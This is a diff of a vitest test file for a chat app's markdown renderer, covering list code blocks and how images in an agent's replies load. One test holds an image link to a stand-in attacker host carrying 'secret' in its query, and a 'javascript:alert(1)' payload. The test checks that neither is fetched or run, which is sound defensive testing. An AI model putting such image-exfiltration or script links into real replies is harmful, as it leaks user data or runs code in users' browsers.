@@ -7,26 +7,20 @@ import { afterEach, describe, expect, it } from "vitest";
 import type { WindowEngine } from "../connect/engine";
 import { ThreadContext } from "./context";
 import { Markdown, parseMarkdown } from "./markdown";
+import { assistantMediaUrl } from "../connect/session";
 
 Object.assign(globalThis, { IS_REACT_ACT_ENVIRONMENT: true });
 let root: Root | undefined;
 afterEach(async () => { if (root) await act(async () => root!.unmount()); root = undefined; document.body.innerHTML = ""; });
 
-const PNG = "iVBORw0KGgo=";
-function engine(files: Record<string, unknown>): WindowEngine & { asked: unknown[] } {
-  const asked: unknown[] = [];
-  return {
-    asked, sessionKey: "agent:juniper:main", scopes: [], onEvent: () => () => {},
-    request: (async (method: string, params: { path: string }) => {
-      asked.push([method, params]);
-      const found = files[params.path];
-      if (found instanceof Error) throw found;
-      return { file: found };
-    }) as WindowEngine["request"],
-  };
-}
+const KEY = "agent:juniper:main";
+/** The engine handle as the session builds it: pictures on the Trunk's computer come from the assistant-media route. */
+const engine: WindowEngine = {
+  sessionKey: KEY, agentId: "juniper", scopes: [], onEvent: () => () => {}, request: (async () => ({})) as WindowEngine["request"],
+  mediaUrl: (source) => assistantMediaUrl("ws://127.0.0.1:19700", source, KEY, "juniper", "tok"),
+};
 
-async function mount(text: string, e?: WindowEngine) {
+async function mount(text: string, e: WindowEngine | undefined = engine) {
   const host = document.body.appendChild(document.createElement("div"));
   root = createRoot(host);
   await act(async () => root!.render(<ThreadContext.Provider value={{ engine: e, name: "Juniper", toast: () => undefined, running: false }}><Markdown text={text} /></ThreadContext.Provider>));
@@ -57,28 +51,69 @@ describe("numbered lists", () => {
   });
 });
 
+describe("code blocks under list items", () => {
+  it("keep a fenced command under a numbered step as a code block, and the next step keeps counting", async () => {
+    const text = "1. Install it:\n   ```bash\n   npm install\n     --save\n   ```\n2. Run it.";
+    const blocks = parseMarkdown(text);
+    expect(blocks).toMatchObject([
+      { type: "list", ordered: true, start: 1, items: [{ text: "Install it:" }] },
+      { type: "code", lang: "bash", text: "npm install\n  --save" },
+      { type: "list", ordered: true, start: 2, items: [{ text: "Run it." }] },
+    ]);
+    const host = await mount(text);
+    expect(host.textContent).not.toContain("```");
+    expect([...host.querySelectorAll("ol")].map((ol) => ol.getAttribute("start"))).toEqual([null, "2"]);
+  });
+
+  it("keep a quote, maths or a table under an item as their own blocks, also after a blank line", () => {
+    const blocks = parseMarkdown("1. Note:\n\n   > careful\n2. Sum:\n   $$a+b$$\n3. Table:\n   | a | b |\n   | --- | --- |\n   | 1 | 2 |");
+    expect(blocks.map((b) => b.type)).toEqual(["list", "quote", "list", "math", "list", "table"]);
+  });
+});
+
 describe("pictures in replies", () => {
-  it("shows a screenshot the Trunk saved as a picture, read through the conversation's files", async () => {
-    const e = engine({ "/home/ubuntu/ws/shot.png": { path: "shot.png", name: "shot.png", missing: false, mimeType: "image/png", contentEncoding: "base64", content: PNG } });
-    const host = await mount("Here it is:\n\n[screenshot](/home/ubuntu/ws/shot.png)", e);
-    expect(e.asked).toEqual([["sessions.files.get", { sessionKey: "agent:juniper:main", path: "/home/ubuntu/ws/shot.png" }]]);
+  it("shows a screenshot the Trunk saved inline, of any size, through the assistant-media route", async () => {
+    const host = await mount("Here it is:\n\n[screenshot](/home/ubuntu/ws/shot.png)");
     const img = host.querySelector(".picture img") as HTMLImageElement;
-    expect(img.getAttribute("src")).toBe(`data:image/png;base64,${PNG}`);
+    const url = new URL(img.getAttribute("src")!);
+    expect(url.origin + url.pathname).toBe("http://127.0.0.1:19700/__branch__/assistant-media");
+    expect(Object.fromEntries(url.searchParams)).toEqual({ source: "/home/ubuntu/ws/shot.png", sessionKey: KEY, agentId: "juniper", token: "tok" });
+    expect(img.getAttribute("referrerpolicy")).toBe("no-referrer");
     expect(img.alt).toBe("screenshot");
     expect(host.textContent).not.toContain("/home/ubuntu");
   });
 
-  it("shows ![alt](https://…) as a picture as is", async () => {
-    const host = await mount("![Chart](https://example.com/chart.png)");
-    expect((host.querySelector(".picture img") as HTMLImageElement).getAttribute("src")).toBe("https://example.com/chart.png");
+  it("uses https for a wss gateway", () => {
+    expect(assistantMediaUrl("wss://hub.example:443/", "/a.png", KEY, undefined, null)).toBe(`https://hub.example/__branch__/assistant-media?source=%2Fa.png&sessionKey=${encodeURIComponent(KEY)}`);
   });
 
-  it("says when a picture is outside the folders the Trunk may read, and offers Try again when it's unavailable", async () => {
-    const outside = Object.assign(new Error("session file not found"), { details: { reason: "outside_session_boundary" } });
-    const e = engine({ "/tmp/shot.png": outside, "/home/x/gone.png": new Error("boom") });
-    const host = await mount("![Screen](/tmp/shot.png)\n\n![Other](/home/x/gone.png)", e);
-    const gone = [...host.querySelectorAll('[data-testid="picture-unavailable"]')].map((el) => el.textContent);
-    expect(gone).toEqual(["IMGScreenOutside allowed folders", "IMGOtherPicture unavailableTry again"]);
+  it("never fetches a picture on the web by itself: it stays a link to open on purpose", async () => {
+    const host = await mount("![Chart](https://attacker.example/c.png?q=secret)\n\nSee [this](https://example.com/x.png) and ![x](javascript:alert(1))");
+    expect(host.querySelector("img")).toBeNull();
+    const links = [...host.querySelectorAll("a")].map((a) => [a.textContent, a.getAttribute("href")]);
+    expect(links).toEqual([["Chart", "https://attacker.example/c.png?q=secret"], ["this", "https://example.com/x.png"]]);
+    expect(host.textContent).toContain("x");
+  });
+
+  it("shows a picture whose bytes are in the reply", async () => {
+    const host = await mount("![dot](data:image/png;base64,iVBORw0KGgo=)");
+    expect((host.querySelector(".picture img") as HTMLImageElement).getAttribute("src")).toBe("data:image/png;base64,iVBORw0KGgo=");
+  });
+
+  it("says Picture unavailable when it doesn't load, and Try again asks again", async () => {
+    const host = await mount("![Screen](/tmp/shot.png)");
+    const img = host.querySelector(".picture img")!;
+    await act(async () => img.dispatchEvent(new Event("error")));
+    const gone = host.querySelector('[data-testid="picture-unavailable"]')!;
+    expect(gone.textContent).toBe("IMGScreenPicture unavailableTry again");
+    await act(async () => (gone.querySelector("button") as HTMLButtonElement).click());
+    expect(new URL(host.querySelector(".picture img")!.getAttribute("src")!).searchParams.get("try")).toBe("1");
+  });
+
+  it("shows a picture named inside a sentence small and inline (no block inside the paragraph)", async () => {
+    const host = await mount("Before ![s](/home/ubuntu/ws/s.png) after.");
+    expect(host.querySelector("p img.md-inline-picture")).not.toBeNull();
+    expect(host.querySelector("p .attachments")).toBeNull();
   });
 
   it("names a local non-picture file without a broken link", async () => {
